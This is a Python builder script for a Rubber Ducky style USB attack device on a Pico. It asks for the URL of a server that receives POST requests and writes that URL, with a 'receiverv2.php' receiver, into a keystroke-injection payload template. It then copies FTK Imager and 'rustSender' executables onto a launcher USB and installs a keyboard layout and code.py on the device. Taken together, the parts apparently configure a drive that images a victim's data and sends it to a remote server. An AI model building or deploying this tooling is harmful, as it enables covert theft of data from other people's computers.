#!/usr/bin/env python3


# (c) 2022 Matthew
# This code is licensed under MIT license (see LICENSE.txt for details)
import os
import os.path
from os import path
import time
import re
import validators 
import subprocess
import shutil

# IMPROVE THIS CODE 

# Get path of CIRCUITPY and rustls payload holder
def builder():

    # Acquire user input for directories of the Pico Pi and USB storing string
    print(":Enter path of Rubber Ducky USB:")
    while True:
        rdUSB = input()
        # Regex checks format to make sure it contains a / as seen on Linux or lexicon: as seen on Windows
        if re.match(r"[a-zA-Z]:", rdUSB) or re.match(r"/", rdUSB):
            if os.path.isdir(rdUSB) != 0:
                print("Enter path of script launcher USB")
                scriptUSB = input()
                if os.path.isdir(scriptUSB) != 0:
                            break
                else:
                    print("Error with drive specified: Enter path of Rubber Ducky USB!")         
            else:
                print("The system cannot find the drive specified. INPUT AGAIN:")
        else:
            print("Incorrect Format [C: <- Windows || / <- LINUX]")
        

    # Validate IP has http: or https: URL using library 
    print("Enter URL of server receiving POST requests (include path to receiver file)")
    valid = False
    while not valid:
        ip = input()
        valid = validators.url(ip)
        if valid==True:
            print("Payload updated")
        else:
            print("Invalid url")

    try:
        # Overwrite "localhost" string in payload.dd with user URL input
        payloadT = open(os.path.join(os.getcwd(), "Builder", "payloadTemplate.dd"), "rt")
        payload = open("payload.dd", "wt")
        for line in payloadT:
            payload.write(line.replace('localhost', ip + "receiverv2.php"))
        payloadT.close()
        payload.close()

        # Copy all necessary executables onto the USB path containing scripts
        shutil.copytree(os.path.join(os.getcwd(), "Builder","ftkimager"), os.path.join(scriptUSB, "ftkimager"))
        shutil.copy(os.path.join(os.getcwd(), "Builder", "exeFiles", "rustSender_WIN.exe"), os.path.join(scriptUSB, "ftkimager", "rustSender_WIN.exe"))
        shutil.copy(os.path.join(os.getcwd(), "Builder", "exeFiles","rustSender_MAC"), os.path.join(scriptUSB, "rustSender_MAC"))
        shutil.copy(os.path.join(os.getcwd(), "Builder", "exeFiles","rustSender"), os.path.join(scriptUSB, "rustSender"))
    except shutil.SameFileError:
        print("Source == Destination")
    except PermissionError:
        print("Permission denied.")

    try:
        # Get correct keyboard layout and move to Pico Pi inside the lib folder
        print("Please select the keyboard country layout [UK is default if no input] \n`list`: see available options")
        # Store all directory options to be printed on request
        key_list = os.listdir(os.path.join(os.getcwd(), "Builder", "KeyboardLayout"))
        while True:
            keyboard_choice = input().upper()
            if keyboard_choice == "LIST":
                key_list.remove('keyboard_layout.py')
                print("List: " + str(key_list))
            if keyboard_choice in key_list:
                #copy contents of selected keyboard folder & keyboard_layout.py to lib folder
                shutil.copy(os.path.join(os.getcwd(), "Builder","KeyboardLayout", "keyboard_layout.py"), os.path.join(rdUSB,"lib","keyboard_layout.py"))
                shutil.copytree(os.path.join(os.getcwd(), "Builder","KeyboardLayout", keyboard_choice), os.path.join(rdUSB,"lib"), dirs_exist_ok=True)

                # Update import text within code.py template to be copied to Pico Pi to use selected keyboard layout when deployed
                codeT = open(os.path.join(os.getcwd(), "Builder", "codeTemplate.py"), "rt")
                code = open("code.py", "wt")
                key_names = os.listdir(os.path.join(os.getcwd(), "Builder", "KeyboardLayout",keyboard_choice))
                if key_names[0].find("layout") != -1:
                    key_names1 = key_names[0].strip(".py")
                    key_names2 = key_names[1].strip(".py")
                else:
                    key_names1 = key_names[1].strip(".py")
                    key_names2 = key_names[0].strip(".py")
                for line in codeT:
                    code.write(line.replace('template_key_layout', key_names1).replace('template_key_code', key_names2))
                codeT.close()
                code.close()
                shutil.move(os.path.join(os.getcwd(), "code.py"), os.path.join(rdUSB, "code.py"))
                break
            else:
                print("Please enter a layout")

    except shutil.SameFileError:
        print("Source == Destination")
    except PermissionError:
        print("Permission denied.")


    # Move payload to rdUSB
    try:
        shutil.move(os.path.join(os.getcwd(), "payload.dd"), os.path.join(rdUSB, "payload.dd"))
    except:
        shutil.move(".\payload.dd", rdUSB)
        
    print("\n\n ########################## \n  REMOVE RUBBER DUCKY NOW!  \n ##########################\n\n")
    return 1




